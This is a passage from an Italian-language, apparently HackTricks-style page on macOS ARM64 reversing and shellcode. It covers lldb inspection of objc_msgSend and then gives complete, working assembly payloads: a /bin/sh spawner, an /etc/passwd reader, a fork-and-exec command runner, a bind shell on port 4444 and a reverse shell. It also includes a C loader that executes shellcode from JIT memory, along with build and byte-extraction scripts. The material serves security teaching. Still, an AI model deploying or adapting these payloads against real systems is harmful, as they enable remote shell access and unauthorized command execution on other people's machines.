- x2... -> Il resto degli argomenti del metodo invocato

Quindi, se inserisci un breakpoint prima del branch verso questa funzione, puoi facilmente trovare cosa viene invocato in lldb con (in questo esempio l'oggetto chiama un oggetto da `NSConcreteTask` che eseguirà un comando):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> Impostando la variabile d'ambiente **`NSObjCMessageLoggingEnabled=1`** è possibile registrare quando questa funzione viene chiamata in un file come `/tmp/msgSends-pid`.
>
> Inoltre, impostando **`OBJC_HELP=1`** e chiamando qualsiasi binary, è possibile vedere altre variabili d'ambiente che si possono usare per **log**gare quando si verificano determinate azioni di Objc-C.

Quando questa funzione viene chiamata, è necessario trovare il metodo chiamato dell'istanza indicata; a questo scopo vengono effettuate diverse ricerche:

- Eseguire una ricerca ottimistica nella cache:
- Se ha successo, terminare
- Acquisire runtimeLock (read)
- Se (realize && !cls->realized), realizzare la classe
- Se (initialize && !cls->initialized), inizializzare la classe
- Provare la cache propria della classe:
- Se ha successo, terminare
- Provare l'elenco dei metodi della classe:
- Se trovato, riempire la cache e terminare
- Provare la cache della superclass:
- Se ha successo, terminare
- Provare l'elenco dei metodi della superclass:
- Se trovato, riempire la cache e terminare
- Se (resolver), provare il method resolver e ripetere la ricerca dalla classe
- Se si è ancora qui (= tutto il resto ha fallito), provare il forwarder

### Shellcodes

Per compilare:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Per estrarre i byte:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Per le versioni più recenti di macOS:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>Codice C per testare la shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Tratto da [**qui**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) e spiegato.<sup>[[1]](#references)</sup>

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### Lettura con cat

L'obiettivo è eseguire `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, quindi il secondo argomento (x1) è un array di parametri (che in memoria corrisponde a uno stack di indirizzi).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Invocare un comando con sh da un fork in modo che il processo principale non venga terminato
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell da [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) sulla **porta 4444**<sup>[[2]](#references)</sup>.
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

Da [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell su **127.0.0.1:4444**<sup>[[3]](#references)</sup>.
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
## Riferimenti

- [1] [daem0nc0re/macOS_ARM64_Shellcode - shell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)
- [2] [daem0nc0re/macOS_ARM64_Shellcode - bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s)
- [3] [daem0nc0re/macOS_ARM64_Shellcode - reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s)

{{#include ../../../banners/hacktricks-training.md}}
